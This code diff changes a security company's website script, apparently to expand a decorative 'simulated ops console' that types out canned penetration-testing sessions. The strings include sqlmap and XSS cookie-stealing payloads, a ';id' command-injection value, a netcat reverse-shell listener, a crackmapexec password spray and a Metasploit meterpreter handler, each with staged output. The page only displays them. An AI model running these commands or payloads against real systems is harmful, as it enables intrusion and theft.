@@ -563,7 +563,7 @@
     canvas.width = panelW*DPR; canvas.height = panelH*DPR;
     canvas.style.width = panelW+'px'; canvas.style.height = panelH+'px';
     ctx.setTransform(DPR,0,0,DPR,0,0);
-    gcx = panelW/2; gcy = panelH/2;
+    gcx = panelW/2 + panelW*0.07; gcy = panelH/2;
     gR = Math.min(panelW,panelH)/2 * 1.35;
   }
   window.addEventListener('resize', resizeMap);
@@ -1046,38 +1046,54 @@
   /* ---------------- SIMULATED OPS CONSOLE ---------------- */
   var opsEl = document.getElementById('opsConsole');
   var opsSequences = [
-    [
-      {t:'root@ops:~$ nmap -sV -T4 10.10.14.22'},
+    [ // SQL injection
+      {t:'root@sweshinfosec:~$ nmap -sV -T4 10.10.14.22', prompt:true},
       {t:'PORT     STATE SERVICE   VERSION'},
       {t:'80/tcp   open  http      nginx 1.18.0'},
       {t:'443/tcp  open  ssl/http  nginx 1.18.0'},
-      {t:'root@ops:~$ sqlmap -u "https://target/login" --batch --dbs'},
+      {t:'root@sweshinfosec:~$ sqlmap -u "https://target/login" --batch --dbs', prompt:true},
       {t:"[*] parameter 'id' appears injectable"},
       {t:'[+] payload: UNION-based, 6 columns'},
       {t:'[+] SQL injection confirmed', cls:'hit'}
     ],
-    [
-      {t:'root@ops:~$ python3 xss_probe.py --reflected'},
+    [ // XSS
+      {t:'root@sweshinfosec:~$ python3 xss_probe.py --reflected', prompt:true},
       {t:'[*] injecting \x3cscript\x3ealert(document.cookie)\x3c/script\x3e'},
       {t:'[*] payload reflected in response body'},
       {t:'[+] stored XSS confirmed on /comments', cls:'hit'}
     ],
-    [
-      {t:'root@ops:~$ curl -s target/api/ping; whoami'},
-      {t:'[*] os command injection via ; whoami'},
-      {t:'www-data'},
-      {t:'[+] remote code execution confirmed', cls:'hit'}
+    [ // OS command injection
+      {t:'root@sweshinfosec:~$ curl -s "target/api/ping?host=127.0.0.1;id"', prompt:true},
+      {t:'[*] os command injection via unsanitized `host` param'},
+      {t:'uid=33(www-data) gid=33(www-data) groups=33(www-data)'},
+      {t:'[+] OS command injection confirmed', cls:'hit'}
     ],
-    [
-      {t:'root@ops:~$ msfconsole -q'},
-      {t:'msf6 > use exploit/multi/handler'},
-      {t:'msf6 > set LHOST 10.10.14.5'},
-      {t:'msf6 > set LPORT 4444'},
-      {t:'msf6 > exploit -j'},
+    [ // netcat reverse shell
+      {t:'root@sweshinfosec:~$ nc -lvnp 4444', prompt:true},
+      {t:'listening on [any] 4444 ...'},
+      {t:'connect to [10.10.14.5] from (UNKNOWN) [10.10.14.22] 51422'},
+      {t:'$ whoami', prompt:true},
+      {t:'www-data'},
+      {t:'[+] netcat reverse shell session established', cls:'hit'}
+    ],
+    [ // red teaming / AD lateral movement
+      {t:"root@sweshinfosec:~$ crackmapexec smb 10.10.14.0/24 -u admin -p 'Spring2026!'", prompt:true},
+      {t:'SMB  10.10.14.12  445  DC01  [+] CORP\\admin:Sp2026! (Pwn3d!)'},
+      {t:'root@sweshinfosec:~$ bloodhound-python -u admin -d corp.local -c All', prompt:true},
+      {t:'[*] Collecting AD trust + session data ...'},
+      {t:'[*] Shortest path to Domain Admins found'},
+      {t:'[+] red team lateral movement path confirmed', cls:'hit'}
+    ],
+    [ // Metasploit meterpreter
+      {t:'root@sweshinfosec:~$ msfconsole -q', prompt:true},
+      {t:'msf6 > use exploit/multi/handler', prompt:true},
+      {t:'msf6 > set LHOST 10.10.14.5', prompt:true},
+      {t:'msf6 > set LPORT 4444', prompt:true},
+      {t:'msf6 > exploit -j', prompt:true},
       {t:'[*] Started reverse TCP handler on 10.10.14.5:4444'},
       {t:'[*] Sending stage (3045380 bytes) to 10.10.14.22'},
       {t:'[+] Meterpreter session 1 opened', cls:'hit'},
-      {t:'msf6 > sessions -i 1'},
+      {t:'msf6 > sessions -i 1', prompt:true},
       {t:'[*] Starting interaction with session 1...'}
     ]
   ];
@@ -1087,7 +1103,6 @@
     var seqIdx = 0;
     var cursorEl = document.createElement('span');
     cursorEl.className = 'cursor';
-    var promptRe = /^(root@ops:~\$|msf6 >)/;
 
     function runSequence(){
       var seq = opsSequences[seqIdx % opsSequences.length];
@@ -1101,7 +1116,7 @@
           return;
         }
         var item = seq[lineIdx++];
-        var isPrompt = promptRe.test(item.t);
+        var isPrompt = !!item.prompt;
         var row = document.createElement('div');
         row.className = 'ln' + (item.cls ? ' ' + item.cls : '');
         var textSpan = document.createElement('span');
